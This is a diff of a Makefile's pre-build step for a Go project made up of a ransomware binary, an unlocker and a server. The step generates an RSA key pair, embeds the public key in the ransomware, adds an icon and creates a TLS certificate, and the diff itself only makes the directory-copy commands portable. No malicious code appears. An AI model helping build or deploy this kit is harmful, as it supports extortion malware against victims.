@@ -19,13 +19,13 @@ deps:
 		github.com/jteeuwen/go-bindata/...
 
 pre-build: clean-bin
-	mkdir -p $(BUILD_DIR)/{ransomware,unlocker,server}
+	mkdir -p $(BUILD_DIR)/ransomware $(BUILD_DIR)/unlocker $(BUILD_DIR)/server
 	openssl genrsa -out $(BUILD_DIR)/server/private.pem 4096
 	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(BUILD_DIR)/ransomware/public.pem
 	cd $(BUILD_DIR)/ransomware && go-bindata -pkg main -o public_key.go public.pem
 	rsrc -manifest ransomware.manifest -ico icon.ico -o $(BUILD_DIR)/ransomware/ransomware.syso
 	cp $(BUILD_DIR)/ransomware/ransomware.syso $(BUILD_DIR)/unlocker/unlocker.syso
-	cp -r $(PROJECT_DIR)/cmd/{ransomware,unlocker,server} $(BUILD_DIR)
+	cd $(PROJECT_DIR)/cmd && cp -r ransomware unlocker server $(BUILD_DIR)
 	cd $(BUILD_DIR)/server && env GOOS=linux go run $(GOROOT)/src/crypto/tls/generate_cert.go --host $(SERVER_HOST)
 	mkdir -p $(BIN_DIR)/server
 
